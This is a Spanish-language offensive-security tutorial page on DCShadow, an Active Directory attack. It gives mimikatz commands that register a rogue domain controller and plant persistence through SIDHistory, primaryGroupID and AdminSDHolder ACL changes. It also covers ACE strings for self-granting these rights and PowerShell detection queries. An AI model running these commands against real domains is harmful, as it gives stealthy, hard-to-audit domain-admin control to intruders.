# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## Información básica

Registra un **nuevo Domain Controller** en el AD y lo utiliza para **insertar atributos** (SIDHistory, SPNs...) en objetos especificados sin dejar ningún **log** sobre las **modificaciones**. Necesitas privilegios de **DA** y estar dentro del **dominio raíz**.\
Ten en cuenta que, si utilizas datos incorrectos, aparecerán logs bastante desagradables.<sup>[[2]](#references)</sup>

Para realizar el ataque necesitas 2 instancias de mimikatz. Una de ellas iniciará los servidores RPC con privilegios de SYSTEM (aquí tienes que indicar los cambios que quieres realizar), y la otra instancia se utilizará para insertar los valores:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Ten en cuenta que **`elevate::token`** no funcionará en la sesión de `mimikatz1`, ya que eso eleva los privilegios del thread, pero necesitamos elevar el **privilegio del proceso**.\
También puedes seleccionar un objeto "LDAP": `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Puedes aplicar los cambios desde un DA o desde un usuario con estos permisos mínimos:

- En el **objeto de dominio**:
- _DS-Install-Replica_ (Agregar/Eliminar réplica en el dominio)
- _DS-Replication-Manage-Topology_ (Administrar la topología de replicación)
- _DS-Replication-Synchronize_ (Sincronización de replicación)
- El **objeto Sites** (y sus objetos secundarios) en el **contenedor Configuration**:
- _CreateChild y DeleteChild_
- El objeto del **equipo registrado como DC**:
- _WriteProperty_ (no _Write_)
- El **objeto objetivo**:
- _WriteProperty_ (no _Write_)

Puedes usar [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) para otorgar estos privilegios a un usuario sin privilegios (ten en cuenta que esto dejará algunos logs). Esto es mucho más restrictivo que tener privilegios de DA.\
Por ejemplo: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Esto significa que el nombre de usuario _**student1**_, al iniciar sesión en el equipo _**mcorp-student1**_, tiene permisos de DCShadow sobre el objeto _**root1user**_.

## Usar DCShadow para crear puertas traseras
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### Abuso del primary group, brechas de enumeración y detección

- `primaryGroupID` es un atributo independiente de la lista `member` del grupo. DCShadow/DSInternals puede escribirlo directamente (por ejemplo, establecer `primaryGroupID=512` para **Domain Admins**) sin la aplicación de políticas de LSASS en el equipo, pero AD aún **mueve** al usuario: cambiar el PGID siempre elimina la membresía del grupo primary anterior (el mismo comportamiento ocurre con cualquier grupo de destino), por lo que no puedes conservar la membresía del grupo primary anterior.<sup>[[1]](#references)</sup>
- Las herramientas predeterminadas impiden eliminar a un usuario de su grupo primary actual (`ADUC`, `Remove-ADGroupMember`), por lo que cambiar el PGID normalmente requiere escrituras directas en el directorio (DCShadow/`Set-ADDBPrimaryGroup`).
- Los informes de membresía son inconsistentes:
- **Incluyen** miembros derivados del grupo primary: `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
- **Omiten** miembros derivados del grupo primary: `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit inspeccionando `member`, `Get-ADUser <user> -Properties memberOf`.
- Las comprobaciones recursivas pueden no detectar miembros del grupo primary si el **primary group** está anidado a su vez (por ejemplo, el PGID del usuario apunta a un grupo anidado dentro de Domain Admins); `Get-ADGroupMember -Recursive` o los filtros recursivos de LDAP no devolverán a ese usuario a menos que la recursión resuelva explícitamente los grupos primary.
- Trucos con DACL: los atacantes pueden **denegar ReadProperty** sobre `primaryGroupID` en el usuario (o sobre el atributo `member` del grupo para grupos que no estén protegidos por AdminSDHolder), ocultando la membresía efectiva de la mayoría de las consultas de PowerShell; `net group` seguirá resolviendo la membresía. Los grupos protegidos por AdminSDHolder restablecerán dichas denegaciones.

Ejemplos de detección/monitorización:
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
Comprueba los grupos privilegiados comparando la salida de `Get-ADGroupMember` con `Get-ADGroup -Properties member` o ADSI Edit para detectar discrepancias introducidas por `primaryGroupID` o atributos ocultos.<sup>[[1]](#references)</sup>

## Shadowception - Otorgar permisos de DCShadow mediante DCShadow (sin registros de permisos modificados)

Debemos añadir las siguientes ACE con el SID de nuestro usuario al final:<sup>[[2]](#references)</sup>

- En el objeto de dominio:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- En el objeto de equipo del atacante: `(A;;WP;;;UserSID)`
- En el objeto del usuario objetivo: `(A;;WP;;;UserSID)`
- En el objeto Sites del contenedor Configuration: `(A;CI;CCDC;;;UserSID)`

Para obtener la ACE actual de un objeto: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Ten en cuenta que en este caso necesitas realizar **varios cambios,** no solo uno. Por lo tanto, en la sesión de **mimikatz1** (servidor RPC), utiliza el parámetro **`/stack` con cada cambio** que quieras realizar. De esta forma, solo tendrás que usar **`/push`** una vez para ejecutar todos los cambios acumulados en el servidor rogue.

[**More information about DCShadow in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)<sup>[[2]](#references)</sup>

## Referencias

- [1] [TrustedSec - Adventures in Primary Group Behavior, Reporting, and Exploitation](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [2] [DCShadow write-up in ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
